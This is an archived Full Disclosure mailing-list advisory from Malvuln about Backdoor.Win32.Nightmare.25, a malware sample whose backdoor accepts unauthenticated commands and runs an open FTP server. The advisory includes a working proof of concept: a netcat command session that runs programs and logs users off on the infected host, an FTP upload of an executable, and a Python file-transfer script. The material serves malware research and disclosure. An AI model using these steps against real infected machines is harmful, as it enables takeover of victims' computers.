---
title: Backdoor.Win32.Nightmare.25 / Unauthenticated Remote Command	Execution
url: https://seclists.org/fulldisclosure/2024/Aug/14
source: Full Disclosure
date: 2024-08-12
fetch_date: 2025-10-06T18:02:09.218475
---

# Backdoor.Win32.Nightmare.25 / Unauthenticated Remote Command	Execution

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.Nightmare.25 / Unauthenticated Remote Command Execution

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Fri, 9 Aug 2024 21:12:27 -0400

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source:
https://malvuln.com/advisory/0fe8f37543e8face08941899add38e35.txt
Contact: malvuln13 () gmail com
Media: x.com/malvuln

Threat: Backdoor.Win32.Nightmare.25
Vulnerability: Unauthenticated Remote Command Execution
Family: Nightmare
Type: PE32
MD5: 0fe8f37543e8face08941899add38e35
SHA256: 591e348b2c1f25a23f0acf55ba10a71957683b54a5682902c2fa179ba278fff6
Vuln ID: MVID-2024-0687
Disclosure: 08/09/2024
Description: The malware listens on TCP ports 666, 5401 and 5402.
Third party adversaries who can reach an infected host on TCP port 666
can issue commands made available by the backdoor. The FTPON command
starts an FTP service on TCP port 21, supply any single character
after the command E.g. "FTPON x". Furthermore, the FTP server allows
for any username/password combination for authentication. Attackers
can then upload their own executable to the victim machine using the
FTP STOR command. This can undermine the initial adversary intrusion
allowing potential takeover by a totally different attacking entity.

Commands available:
RUN (run programs)
FTPON x  (starts FTP)
SHOWCHAT x
LOGOFF x  (logs out current user)
KILLAPP
LISTAPP
KILL x (shuts down the backdoor)

Exploit/PoC:
nc64.exe 192.168.18.125 666

RUN MSPAINT.EXE
Program executed

FTPON x
FTP Port open

FTPOFF x
FTP Port close

SHOWCHAT x
Chat is visible  (will launch a chat terminal on the slave)

HIDECHAT x
Chat is invisible

LISTAPP x
*File: Backdoor.Win32.Nightmare.25.0fe8f37543e8face08941899add38e35.exe
- PID: 4284
*Process Hacker [DESKTOP-2C4IQJO\VICTIM]+ (Administrator)
*dump
*Administrator: Administrator Command Prompt
*Program Manager

KILL x
Server not anymore active

LOGOFF x

nc64.exe 192.168.18.125 21
220 P23h FTP Server ready.
USER x
331 Password required for x.
PASS x
230 User x logged in.
SYST
215 UNIX Type: L8 Internet Component Suite
CDUP \
250 CWD command successful. "C:/" is current directory.
MKD TEMP
257 'C:\TEMP': directory created.
PASV
227 Entering Passive Mode (192,168,18,125,226,100).
STOR DOOM_SM.exe
150 Opening data connection for DOOM_SM.exe.
226 File received ok

from socket import *

MALWARE_HOST="192.168.18.125"
PORT=57956  #Calculated port for file transfers 226 * 256 + 100 = 57956
DOOM="DOOM_SM.exe"

def doit():
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    f = open(DOOM, "rb")
    EXE = f.read()
    s.send(EXE)

    while EXE:
        s.send(EXE)
        EXE=f.read()

    s.close()
    print("By Malvuln");

if __name__=="__main__":
    doit()

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or
otherwise. Permission is hereby granted for the redistribution of this
advisory, provided that it is not altered except by reformatting it,
and that due credit is given. Permission is explicitly given for
insertion in vulnerability databases and similar, provided that due
credit is given to the author. The author is not responsible for any
misuse of the information contained herein and accepts no
responsibility for any damage caused by the use or misuse of this
information. The author prohibits any malicious use of security
related information or exploits by the author or elsewhere. Do not
attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper
Malware handling or the downloading of ANY Malware mentioned on this
website or elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

### Current thread:

* **Backdoor.Win32.Nightmare.25 / Unauthenticated Remote Command Execution** *malvuln (Aug 10)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")